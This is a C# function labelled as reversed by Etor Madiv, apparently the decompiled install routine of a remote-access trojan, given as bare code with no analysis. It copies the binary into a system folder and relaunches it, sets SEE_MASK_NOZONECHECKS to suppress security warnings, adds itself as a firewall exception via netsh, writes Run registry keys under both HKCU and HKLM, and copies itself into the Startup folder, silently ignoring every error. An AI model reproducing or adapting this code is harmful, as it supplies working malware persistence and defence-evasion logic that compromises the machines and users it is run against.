//Reversed by Etor Madiv

public static void  INS()
{
	byte[]               dataBytes;
	System.IO.FileStream serverStream;
    string[]             firewallCommand;
	
	System.Threading.Thread.Sleep(0x3e8);
	
	if( Idr )
	{
		if( ! CompDir(
			LO,
			new System.IO.FileInfo(
				System.String.Concat(
					Microsoft.VisualBasic.Interaction.Environ( DR ).ToLower(),
					"\\",
					EXE.ToLower()
			  )
		    )
		  )
		)
		{
			try
			{
				if( System.IO.File.Exists(
					System.String.Concat(
						Microsoft.VisualBasic.Interaction.Environ( DR ),
						"\\",
						EXE
					)
				  )
        		)
				{
					System.IO.File.Delete(
						System.String.Concat(
							Microsoft.VisualBasic.Interaction.Environ( DR ),
							"\\",
							EXE
						)
					);
				}
				
				serverStream = new System.IO.FileStream(
					System.String.Concat(
							Microsoft.VisualBasic.Interaction.Environ( DR ),
							"\\",
							EXE
					),
					(System.IO.FileMode) 1 
				);
				
				dataBytes = System.IO.File.ReadAllBytes( LO.FullName );
				
				serverStream.Write(dataBytes, 0, dataBytes.Length);
				serverStream.Flush();
				serverStream.Close();
				
				LO = new System.IO.FileInfo(
					System.String.Concat(
						Microsoft.VisualBasic.Interaction.Environ( DR ),
						"\\",
						EXE
					)
				);
				
				System.Diagnostics.Process.Start( LO.FullName );
			}
			catch(Exception)
			{
				
			}
			Microsoft.VisualBasic.CompilerServices.ProjectData.EndApp();
		}
	}
	
	try
	{
		System.Environment.SetEnvironmentVariable("SEE_MASK_NOZONECHECKS", "1", (System.EnvironmentVariableTarget) 1);
	}
	catch(Exception)
	{
		
	}
	
	try
	{
		firewallCommand = new System.String[5];
		
		firewallCommand[0] = "netsh firewall add allowedprogram \"";
		firewallCommand[1] = LO.FullName;
		firewallCommand[2] = "\" \"";
		firewallCommand[3] = LO.Name;
		firewallCommand[4] = "\" ENABLE";
		
		Microsoft.VisualBasic.Interaction.Shell(
		    System.String.Concat(firewallCommand),
            (Microsoft.VisualBasic.AppWinStyle) 0,
            true,
            0x1388
		);
		
	}
	catch(Exception)
	{
		
	}
	
	if(Isu)
	{
		try
		{
			F.Registry.CurrentUser.OpenSubKey(sf, true).SetValue(
				RG,
				System.String.Concat(
					"\"",
					LO.FullName,
					"\" .."
				)
			);
		}
		catch(Exception)
		{
			
		}
		
		try
		{
			F.Registry.LocalMachine.OpenSubKey(sf, true).SetValue(
				RG,
				System.String.Concat(
					"\"",
					LO.FullName,
					"\" .."
				)
			);
		}
		catch(Exception)
		{
			
		}		
	}
	
	if(IsF)
	{
		try
		{
			System.IO.File.Copy(
				LO.FullName,
				System.String.Concat(
					System.Environment.GetFolderPath( (System.Environment.SpecialFolder) 7 ),
					"\\",
					RG,
					".exe"
				),
				true
			);
			
			FS = new System.IO.FileStream(
				System.String.Concat(
					System.Environment.GetFolderPath( (System.Environment.SpecialFolder) 7 ),
					"\\",
					RG,
					".exe"
				),
				(System.IO.FileMode) 3
			);
		}
		catch(Exception)
		{
			
		}
	}
}
